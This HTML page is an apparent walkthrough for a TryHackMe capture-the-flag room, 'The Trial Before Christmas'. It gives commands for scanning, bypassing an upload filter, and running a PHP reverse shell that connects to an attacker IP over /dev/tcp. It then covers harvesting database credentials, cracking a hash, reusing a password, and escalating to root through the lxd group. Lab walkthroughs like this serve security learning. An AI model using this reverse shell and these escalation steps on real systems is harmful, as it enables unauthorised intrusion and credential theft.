<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Task 29 [Day 24] Special by DarkStar The Trial Before Christmas</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Task 29 [Day 24] Special by DarkStar The Trial Before Christmas</h1><br/>1.  Scan the machine. What ports are open?<br />	nmap -sV -sS 10.10.117.253<br />	<br />	Answer: 80, 65000<br /><br /><br />2. What's the title of the hidden website?<small>Â It's worthwhile looking recursively at all websites on the box for this step.</small><br />	Visit 10.10.117.253:65000	<br />	<br />	Answer: Cyber Light<br /><br /><br />3. What is the name of the hidden php page?<br />	gobuster dir -t 100 -w /usr/share/wordlists/dirb/big.txt -u <a href="http://10.10.117.253:65000">http://10.10.117.253:65000</a> -x .php<br />	<br />	uploads.php<br /><br /><br />4. What is the name of the hidden directory where file uploads are saved?<br />   the gobuster scan revealed grid<br /><br />	Answer: grid<br /><br />5. Bypass the filters. Upload and execute a reverse shell.<br />	visit 10.10.117.253:65000/uploads.php while Burpsuite is active.<br />	change the settings of Burp so that JS files get blocked by the proxy as well<br />	when visiting the site forward everything but filter.js<br />	afterwards create a php reverseshell that can be uploaded:<br />	<div class="codebox"><div class="codebox">&lt;?php<br />		exec(<span style="color:#3ad900;font-weight:400">"/bin/bash&nbsp;-c&nbsp;'bash&nbsp;-i&nbsp;&gt;&nbsp;/dev/tcp/10.9.237.36/4444&nbsp;0&gt;&amp;1'"</span>);</div></div><br />	save it as something like revshell.png.php<br />	this is done so that the upload filter on the server's side is bypassed as well<br />	afterwards, start a netcat session:<br />	nc -lvnp 4444<br />	go to 10.10.117.253:65000/grid and click on the file that was just uploaded<br />	<br />	This should establish a reverse shell connection with the box	<br />	<br />	<br /><br />6. What is the value of the web.txt flag?<br />	web.txt is located in /var/www<br />	navigate there using cd<br />	cat web.txt<br />	<br />	Answer: THM{ENTER_THE_GRID}<br /><br /><br />7. Upgrade and stabilize your shell.<br />	<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> to spawn a bash shell<br />	<code>export TERM=xterm</code> to give access to commands such as clear<br />	<code>Ctrl + Z</code> to move the shell into the backround<br />	<code>stty raw -echo; fg</code> to turn of echoes of the original shell (thus giving access to things such as tab complete, arrow keys, ctrl + c, etc) and it brings the netcat shell back into the foreground.<br /><br /><br />8. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? <strong>username:password</strong><br />	cd /var/www/TheGrid<br />	cat dbauth.php<br />	<br />	<img src="images/23-1.png" alt="images/23-1.png" /><br />	<br />	Answer: tron:IFightForTheUsers<br /><br /><br />9. Access the database and discover the encrypted credentials. What is the name of the database you find these in?<br />	mysql -h localhost -u tron -p (-h for the host name; -u for the username; -p to be prompted with a password)<br />	show tables;<br />	select * from users;<br />	<br />	Answer: tron<br /><br /><br />10. Crack the password. What is it?<br />	<img src="images/23-2.png" alt="images/23-2.png" /><br />	<br />	Using crackstation.net, flynn's passsword is @computer@<br />	<br />	Answer: @computer@<br /><br /><br />11. Use su to login to the newly discovered user by exploiting password reuse.<br />	su flynn<br />	@computer@<br /><br /><br />12. What is the value of the user.txt flag?<br />	find / -name user.txt | grep user.txt (to find the file among all the errors)<br />	cat ~/user.txt<br />	<br />	Answer: THM{IDENTITY_DISC_RECOGNISED}<br /><br /><br />13. Check the user's groups. Which group can be leveraged to escalate privileges?<br />	groups<br />	<br />	Answer: lxd<br /><br /><br />14. Abuse this group to escalate privileges to root.<br />	On our own machine:	<br />	sudo snap install lxd<br />	sudo adduser user lxd<br />	newgrp lxd<br />	<br />	in the folder where github.com/lxd-images/alpine-3-7-apache-php5-6 was downloaded<br />	sudo bash ./import.sh<br />	<br />	then spin up a python server:<br />	python3 -m http.server 8080<br />	<br />	<br />	on the victim machine:<br />	navigate to the home folder<br />	wget 10.9.237.36:8080/alpine-3-7-apache-php5-6.tar.bz2<br />	<br />	lxc image import alpine-3-7-apache-php5-6.tar.bz2<br />	<br />	then follow the instructions on <a href="https://tryhackme.com/room/adventofcyber2">https://tryhackme.com/room/adventofcyber2</a><br />	<br />	for further information: <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a><br />	<br />	<br /><br /><br />15. What is the value of the root.txt flag?<br />	cd /mnt/mnt/root/root<br />	cat root.txt<br />	<br />	Answer: THM{FLYNN_LIVES}<br /><br /></div></body></html>